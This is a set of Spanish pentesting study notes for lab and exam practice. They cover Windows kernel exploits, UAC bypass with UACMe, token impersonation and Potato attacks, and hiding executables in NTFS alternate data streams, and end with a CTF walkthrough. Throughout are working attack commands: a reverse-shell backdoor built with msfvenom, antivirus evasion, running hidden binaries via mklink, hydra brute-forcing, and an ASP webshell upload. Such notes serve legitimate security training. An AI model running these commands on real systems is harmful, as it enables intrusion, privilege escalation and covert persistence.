-----
## WINDOWS KERNEL EXPLOITS

### ¿Qué es la escalada de privilegios?

La **privilege escalation** es el proceso de explotar:

- vulnerabilidades
- configuraciones inseguras (_misconfigurations_)

para elevar privilegios desde:

- un **usuario normal**
- hasta **Administrator / NT AUTHORITY\SYSTEM**

📌 Es una **fase crítica del ciclo de ataque**:  
sin escalada → no hay control real del sistema.

## ¿QUÉ ES EL KERNEL?

El **kernel** es el **núcleo del sistema operativo**.

- Es el programa central del sistema    
- Tiene **control total** sobre:    
    - CPU
    - memoria
    - dispositivos
    - hardware
- Gestiona la comunicación entre software y hardware

👉 En otras palabras:  
si controlas el kernel, **controlas absolutamente todo**.
## WINDOWS NT KERNEL

- **Windows NT** es el kernel usado por **todas las versiones modernas de Windows**
- Viene **preinstalado (pre-packaged)** en el sistema

Windows sigue una filosofía de **User / Kernel mode**:
### 🔹 User Mode

- Acceso limitado
- Se ejecutan:
    - aplicaciones
    - servicios
    - procesos de usuario
- No puede acceder directamente al hardware

Ejemplo:

- navegadores
- shells
- programas normales (como este 😄)
    
### 🔹 Kernel Mode

- Acceso **sin restricciones**
- Control total del sistema
- Ejecuta:
    - drivers
    - kernel
    - componentes críticos

📌 Un fallo aquí = **privilegios SYSTEM**

## WINDOWS KERNEL EXPLOITATION

Consiste en:

- explotar **vulnerabilidades del kernel**    
- para elevar privilegios localmente

⚠️ **Advertencia importante**:

- No es el método más recomendable
- Riesgos:
    - corrupción del kernel
    - crash del sistema
    - pérdida de información
- Se usa **cuando no hay otras vías** de escalada

## METODOLOGÍA GENERAL

1. Identificar vulnerabilidades del kernel    
2. Detectar **parches faltantes**
3. Buscar exploits públicos
4. Descargar / compilar el exploit
5. Transferirlo al sistema víctima
6. Ejecutarlo localmente

## HERRAMIENTAS PRINCIPALES

### 🔹 windows-exploit-suggester

Herramienta que:
- analiza la salida de `systeminfo`
- compara contra una **base de datos de parches**
- detecta:
    - vulnerabilidades del kernel
    - parches faltantes
    - exploits públicos
    - módulos de Metasploit disponibles

👉 Ideal para **priorizar exploits con más probabilidad de éxito**

### 🔹 windows-kernel-exploits (GitHub)

Repositorio con:
- exploits reales de kernel
- clasificados por:
    - CVE
    - MS Bulletin (ej: MS16-135)
- muy usado en labs y CTFs
## EXPLOTACIÓN DESDE METASPLOIT

### 1️⃣ Comprobar sesión activa

`sessions`

### 2️⃣ Intentar escalada automática

`getsystem`

📌 Si funciona → perfecto  
📌 Si falla → seguimos con kernel exploits

### 3️⃣ Usar exploit suggester en Metasploit

`search suggester use post/multi/recon/local_exploit_suggester set SESSION ID run`

- Muestra posibles exploits
- Algunos requieren descarga manual desde GitHub

📌 Nota:

- A veces hay que cambiar el puerto:

`set RPORT PUERTO`

(si el puerto por defecto está ocupado)
## USO DE WINDOWS-EXPLOIT-SUGGESTER (MANUAL)

### En la máquina víctima (sin privilegios)

`shell cd C:\Temp systeminfo`

- Copiar la salida
- Guardarla en el atacante como:

`win7.txt`
### En la máquina atacante

`git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git cd Windows-Exploit-Suggester`
#### Actualizar base de datos

`./windows-exploit-suggester.py --update`

#### Analizar el sistema

`./windows-exploit-suggester.py \ --database <base_actualizada>.xls \ --systeminfo /ruta/win7.txt`

📌 Cuanto **más alta la severidad**,  
👉 **mayor probabilidad de éxito**
## EXPLOTACIÓN MANUAL CON WINDOWS-KERNEL-EXPLOITS

### 1️⃣ Buscar el exploit sugerido

Ejemplo:

`MS16-135`

- Buscar en:
    - GitHub
    - SecWiki
    - windows-kernel-exploits
### 2️⃣ Descargar el ejecutable

Ejemplo:

`415.exe`

📌 Si hay antivirus:

- puede ser necesario:
    - ofuscar
    - modificar
    - recompilar
### 3️⃣ Transferir a la víctima

`cd C:\Temp upload /ruta/Downloads/415.exe`

### 4️⃣ Ejecutar el exploit

`shell .\415.exe`

🎯 Resultado esperado:

- Shell como **NT AUTHORITY\SYSTEM**
- Privilegios máximos

---
## BYPASSING UAC WITH UACME

## ¿Qué es UAC?

**UAC (User Account Control)** es una **funcionalidad de seguridad** introducida en **Windows Vista** cuyo objetivo es:

- prevenir **cambios no autorizados** en el sistema operativo
- evitar que el malware obtenga privilegios elevados silenciosamente
### ¿Cómo funciona?

- Cuando un proceso quiere realizar cambios críticos:
    - pide **confirmación**
    - o solicita **credenciales de administrador**
- Incluso si el usuario pertenece al grupo **Administrators**, los procesos:
    - se ejecutan **con privilegios limitados por defecto**
    - necesitan **elevación explícita**

👉 Si NO eres administrador → te pedirá credenciales  
👉 Si ERES administrador → te pedirá confirmación (popup UAC)
## REQUISITO PARA BYPASS UAC

Para poder **bypassear UAC**, necesitamos:
- acceso previo al sistema
- una sesión con un usuario que pertenezca al grupo:

`Local Administrators`

📌 Importante:

- **UAC no protege contra administradores**
- solo separa **token limitado vs token elevado**

## ¿QUÉ ES UACME?

**UACMe** es un proyecto de código abierto creado por **hfiref0x**:
🔗 GitHub: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

Permite:

- **bypassear UAC**
- ejecutar binarios con **privilegios elevados**
- sin mostrar el prompt de UAC

## ¿CÓMO FUNCIONA UACME?

UACMe **abusa de herramientas internas de Windows con auto-elevación**.

### 🔹 ¿Qué es auto-elevate?

Windows incluye binarios **firmados por Microsoft** que:

- se ejecutan automáticamente con privilegios elevados    
- **no muestran prompt UAC**

Ejemplos:

- `fodhelper.exe`
- `eventvwr.exe`
- `computerdefaults.exe`

👉 UACMe aprovecha **errores lógicos y configuraciones inseguras** en estos binarios.

## COMPROBACIONES INICIALES

### 1️⃣ Ver si somos administradores

`net localgroup administrators`

✔ Nuestro usuario debe aparecer en la lista
## ESCENARIO DE EXPLOTACIÓN (EJEMPLO)

Supongamos:

- máquina Windows vulnerable
- servicio **Rejetto HFS 2.3** en el puerto 80

### 2️⃣ Obtener acceso inicial

`service postgresql start msfconsole search rejetto_hfs_exec use exploit/windows/http/rejetto_hfs_exec`

Una vez dentro → **Meterpreter session**

## PREPARACIÓN DEL ENTORNO

### 3️⃣ Comprobar arquitectura y sistema

`sysinfo`

📌 Importante:

- confirmar si es **x86 o x64**
### 4️⃣ Migrar a explorer.exe

`pgrep explorer migrate PID`

👉 Necesario para:

- estabilidad
- interacción con escritorio
- bypass UAC
### 5️⃣ Comprobar privilegios actuales

`getprivs`
### 6️⃣ Ver usuarios y grupos

`shell net user net localgroup administrators`
✔ Confirmamos que el usuario está en **Administrators**

## PREPARAR PAYLOAD

### 7️⃣ Generar backdoor

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=MI_IP LPORT=1234 -f exe > backdoor.exe`
### 8️⃣ Preparar handler

`msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST MI_IP set LPORT 1234 run`
## USO DE UACME (AKAGI)

📌 En Kali, UACMe suele venir incluido (`Akagi64.exe`)

### 9️⃣ Subir archivos al objetivo

Desde Meterpreter:

`cd C:\\ mkdir Temp cd C:\\Temp upload backdoor.exe upload /root/Desktop/tools/UACME/Akagi64.exe`

### 🔟 Ejecutar bypass UAC

`shell Akagi64.exe 23 C:\Temp\backdoor.exe`

📌 El número **23**:

- corresponde a un método concreto de bypass    
- en el README de UACMe se explica:
    - qué método
    - qué versión de Windows
    - cuándo fue parcheado
    
## RESULTADO

- Se abre **una nueva sesión Meterpreter**
- Esta vez con **privilegios elevados**
- Sin prompt UAC 🎯

## ESCALADA FINAL A SYSTEM

### 1️⃣ Buscar proceso SYSTEM

`ps`

Buscar algo como:

`NT AUTHORITY\SYSTEM`
### 2️⃣ Migrar

`migrate PID`
### 3️⃣ Verificar

`shell whoami`

🎉 Resultado:

`nt authority\system`

---
## ACCESS TOKEN IMPERSONATION (WINDOWS)

## ¿Qué es un Access Token en Windows?

Un **Access Token** es un **objeto de seguridad temporal** que representa **la identidad y privilegios de un usuario o proceso** en Windows.

👉 Piensa en él como:

- una **credencial viva**
- similar a una **cookie de sesión**, pero a nivel de sistema operativo
### ¿Cuándo se crea un Access Token?

1. Un usuario introduce sus credenciales
2. `winlogon.exe` valida el login
3. `lsass.exe` crea un **access token**
4. Ese token:
    - contiene **quién eres**
    - **qué privilegios tienes**
    - **a qué grupos perteneces**
5. El token se **asocia (attach)** al proceso inicial del usuario:
    - normalmente `explorer.exe`
    - y a partir de ahí se hereda por los procesos hijos

📌 **Todos los procesos en Windows corren con un access token**  
No hay proceso sin token. Cero. Ninguno.
## ¿QUÉ CONTIENE UN ACCESS TOKEN?

Un token incluye, entre otras cosas:

- Usuario (SID)
- Grupos (Administrators, Users, etc.)
- Privilegios (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.)
- Nivel de integridad
- Tipo de token (primary / impersonation)

👉 Windows **no comprueba el usuario directamente**, comprueba **el token**.

## TIPOS DE ACCESS TOKENS

### 🔹 1. Impersonation-Level Token

- Permite a un proceso **actuar como otro usuario**
- Muy usado en:
    - servicios
    - autenticaciones
    - pipes
- **No puede** iniciar procesos nuevos como ese usuario
- Solo sirve para:
    - acceder a recursos
    - ejecutar acciones puntuales

📌 Es el tipo de token **más común para ataques de impersonation**
### 🔹 2. Delegation-Level Token

- Nivel más alto
- Permite:
    - **impersonar al usuario**
    - **delegar su identidad a otros sistemas**
- Usado en:
    - entornos de dominio
    - autenticación Kerberos
- Mucho menos común
- Mucho más peligroso

👉 En pentesting **casi siempre trabajas con impersonation tokens**, no delegation.
## ¿QUÉ ES TOKEN IMPERSONATION?

**Token Impersonation** es la técnica mediante la cual:

- un proceso **roba o reutiliza** un access token válido
- y **actúa como el usuario dueño de ese token**
- **sin conocer su contraseña**

🎯 Objetivo:

- elevar privilegios
- pasar de user → admin → SYSTEM
## PRIVILEGIOS NECESARIOS PARA TOKEN IMPERSONATION

Aquí viene la confusión típica, vamos a aclararla bien 👇
### 🔸 SeImpersonatePrivilege

📌 **EL MÁS IMPORTANTE**

Permite:
- impersonar tokens de otros usuarios
- actuar como ellos temporalmente

👉 Si un proceso tiene este privilegio:

- y existe un token interesante (admin/SYSTEM)
- **es candidato directo a privesc**

🔥 Muchos exploits modernos (PrintSpoofer, JuicyPotato, etc.) dependen de este.

### 🔸 SeAssignPrimaryTokenPrivilege

Permite:
- asignar un **primary token** a un proceso nuevo

👉 Útil cuando:
- quieres lanzar un proceso **como otro usuario**
- no solo impersonarlo

No siempre es necesario para un ataque básico.
### 🔸 SeCreateTokenPrivilege

Permite:
- crear tokens desde cero

📌 Muy raro de ver  
📌 Normalmente solo lo tiene SYSTEM

👉 **No es necesario** en la mayoría de ataques reales.
### ❓ ¿TIENEN QUE ESTAR LOS TRES?

❌ **NO**

En la práctica:

- **SeImpersonatePrivilege** → suele ser suficiente
- Los otros dos son:
    - contextuales
    - casos muy específicos

👉 Si ves `SeImpersonatePrivilege` habilitado → **sonríe** 😏

## ¿DÓNDE SE ABUSAN LOS TOKENS?

- Servicios que:    
    - aceptan conexiones
    - usan impersonation
- Procesos corriendo como:
    - `NT AUTHORITY\SYSTEM`
- Named pipes
- Servicios mal configurados

## INCÓGNITO (METASPLOIT)

### ¿Qué es Incognito?

**Incognito** es un módulo de Meterpreter que permite:

- listar access tokens disponibles
- impersonar tokens sin contraseña
- escalar privilegios si hay tokens interesantes
### Cargar incognito

`load incognito`

### Listar tokens disponibles

`list_tokens -u`

Ejemplo:

`Delegation Tokens Available: `
`NT AUTHORITY\SYSTEM ` 
`Impersonation Tokens Available: Administrator`

👉 Si ves `SYSTEM` o `Administrator` → **jackpot** 🎰
### Impersonar un token

`impersonate_token "NT AUTHORITY\SYSTEM"`
`pgrep explorer` -> proceso que pertenece al **usuario logueado**
`migrate codigo`
`getprivs` -> elevated sesion

## ¿QUÉ PASA SI `list_tokens -u` NO DEVUELVE NADA?

Si al ejecutar en Meterpreter:

`load incognito list_tokens -u`

y **NO aparecen tokens** (ni impersonation ni delegation):

👉 significa que **no hay tokens interesantes disponibles para robar** en ese momento.

Esto suele pasar cuando:

- no hay otros usuarios logueados
- no hay servicios exponiendo tokens reutilizables
- el proceso donde estás **no puede ver tokens ajenos**

📌 Importante:

- **NO significa que no se pueda escalar**
- solo que **token impersonation directa no es posible**
## EN ESE CASO → TÉCNICAS “POTATO”

Aquí entran en juego los **Potato attacks** 🥔😈

## ¿QUÉ SON LOS POTATO ATTACKS?

Los _Potato_ son una familia de exploits que permiten:

- abusar de **SeImpersonatePrivilege**
- forzar a un servicio **SYSTEM** a autenticarse contra nosotros
- capturar ese token
- **impersonar NT AUTHORITY\SYSTEM**

👉 No necesitan que haya tokens visibles previamente.

## REQUISITO CLAVE

Para que un Potato funcione necesitas:

`SeImpersonatePrivilege = ENABLED`

Puedes comprobarlo con:

`getprivs`

Si ves:

`SeImpersonatePrivilege`

🎯 **objetivo desbloqueado**

---
## ¿QUÉ CONSIGUE POTATO?

- Token **NT AUTHORITY\SYSTEM**
- Escalada directa a SYSTEM
- Sin contraseña
- Sin UAC

Resultado final:

`whoami nt authority\system`
## PRINCIPALES VARIANTES DE POTATO

(depende de la versión de Windows)

- **JuicyPotato** → Windows antiguos
- **RoguePotato**
- **PrintSpoofer** → muy fiable en Windows modernos
- **SweetPotato**

📌 Hoy en día:

- **PrintSpoofer** es el más común
- JuicyPotato suele estar parcheado

----
## WINDOWS FILE SYSTEM VULNERABILITIES

## ALTERNATE DATA STREAMS (ADS)

### ¿QUÉ SON LOS ADS?

**Alternate Data Streams (ADS)** son una **característica del sistema de archivos NTFS**.

👉 Son **atributos de archivo** que permiten que **un mismo archivo tenga múltiples flujos de datos (streams)**.

Fueron diseñados originalmente para:
- mantener **compatibilidad con HFS (macOS antiguo)**
- almacenar **metadatos adicionales** sin afectar al archivo principal

📌 **Solo existen en NTFS**  
(FAT32 / exFAT → no soportan ADS)
## ESTRUCTURA DE UN ARCHIVO EN NTFS

En NTFS, un archivo puede tener **varios streams**:
### 🔹 Data Stream (principal)

- Contiene el **contenido real del archivo**
- Es lo que ves normalmente
- Ejemplo:
    `test.txt`
### 🔹 Alternate / Resource Streams

- Streams ocultos
- No aparecen con `dir`
- Se accede con la sintaxis:
    `archivo:stream`

👉 Windows **no muestra estos streams por defecto**.
## ¿POR QUÉ SON UNA VULNERABILIDAD?

Los atacantes pueden usar ADS para:

- **ocultar código malicioso**    
- esconder ejecutables dentro de archivos legítimos
- evadir:
    - antivirus basados en firmas
    - escaneos estáticos
    - revisiones manuales

📌 El archivo parece inofensivo,  
📌 pero **el malware está dentro del stream oculto**.
## EJEMPLO BÁSICO DE ADS

### Crear un archivo con un stream oculto

`notepad test.txt:secret.txt`

- `test.txt` → archivo visible
- `secret.txt` → stream oculto

Para abrirlo:
`notepad test.txt:secret.txt`

👉 El stream existe, aunque **`test.txt` parezca vacío**.
## OCULTAR UN EJECUTABLE CON ADS

### Ejemplo: ocultar `winPEAS.exe`

`type winPEAS.exe > windowslogs.txt:winpeas.exe`

Ahora:

- `windowslogs.txt` → archivo visible    
- `winpeas.exe` → oculto en un ADS
### Hacer que el archivo parezca legítimo

`notepad windowslogs.txt`

Añades texto tipo:

`Windows update log file Last update: OK`

👉 Para un usuario (o AV básico), es solo un log.

## ¿POR QUÉ NO SE PUEDE EJECUTAR DIRECTAMENTE?

Si intentas:

`start windowslogs.txt:winpeas.exe`

❌ Windows **no permite ejecutar directamente un ADS**.

Esto es una **limitación de seguridad**.
## BYPASS: EJECUTAR ADS CON MKLINK

Aquí está el truco interesante 😈
### Crear un enlace simbólico al ADS

`cd C:\Windows\System32` 
`mklink wupdate.exe C:\Temp\windowslogs.txt:winpeas.exe`

Esto crea:

- `wupdate.exe` → enlace simbólico
- apunta al ADS oculto
### Ejecutar el binario oculto

`wupdate.exe`

🎯 Resultado:

- Se ejecuta **winPEAS.exe**
- Desde un archivo que **no existe visiblemente**
- El malware sigue oculto en el ADS
## ¿POR QUÉ FUNCIONA?

- Windows **sí ejecuta enlaces simbólicos**
- El enlace apunta al ADS
- NTFS resuelve el stream internamente
- El usuario / AV ve un `.exe` aparentemente normal
## ¿PARA QUÉ SE USA ADS EN ATAQUES?

- Evasión de antivirus básicos
- Persistencia
- Ocultación de herramientas:
    - winPEAS
    - backdoors
    - loaders
- Living-off-the-land + sigilo

📌 Hoy en día:

- muchos AV modernos **ya detectan ADS**
- pero sigue siendo relevante en:
    - sistemas antiguos
    - entornos mal configurados
    - labs y exámenes
## DETECCIÓN (MENTALIDAD BLUE TEAM)

Comandos útiles:

`dir /r`

Muestra:

- archivos
- **streams alternativos**

## RESUMEN CLAVE (PARA MEMORIZAR)

- ADS = feature de **NTFS**    
- Permite **ocultar datos en archivos**
- No aparecen en `dir`
- Se accede con:
    `archivo:stream`
- No se ejecutan directamente
- Se pueden ejecutar vía:
    - `mklink`
- Usado para:
    - evasión
    - ocultación
    - persistencia

---
# CTF – WALKTHROUGH RESUMIDO

## 🏁 FLAG 1 – HTTP Bruteforce

**Objetivo:** credenciales vía HTTP basic / form

`hydra -l bob \ -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \ http-get://target1.ine.local/`

📌 Notas:

- `share` → **es `share`, no `shares`**
- `http-get /` se expresa como `http-get://host/`
🎯 Resultado: credenciales de **bob**
## 🏁 FLAG 2 – WebDAV Enumeration

**Objetivo:** comprobar si existe WebDAV y encontrar la flag

`http://target1.ine.local/webdav`

- Si el directorio existe y es accesible → **flag directa**
- Muy típico en labs INE/eJPT
## 🏁 FLAG 3 – WebDAV Exploitation

### 1️⃣ Comprobar permisos y extensiones

`davtest -auth bob:password_123321 \ -url http://target1.ine.local/webdav`
### 2️⃣ Acceder con cadaver

`cadaver http://target1.ine.local/webdav`

### 3️⃣ Subir webshell ASP

`put /usr/share/webshells/asp/webshell.asp`

### 4️⃣ Ejecutar comandos desde el navegador

Acceder a:

`http://target1.ine.local/webdav/webshell.asp`

Desde ahí:

`cd C:\`

🎯 Flag obtenida desde el sistema.

## 🏁 FLAG 4 – SMB Bruteforce + WinRM

### 1️⃣ Fuerza bruta SMB

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \ -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \ smb://target2.ine.local`

📌 Ojo:

- `commun_users.txt` → **`common_users.txt`**
- `shares` → **`share`**
### 2️⃣ Acceso remoto con Evil-WinRM

`evil-winrm -u 'administrator' -p 'pineapple' -i target2.ine.local`

🎯 Acceso como **Administrator** → flag final.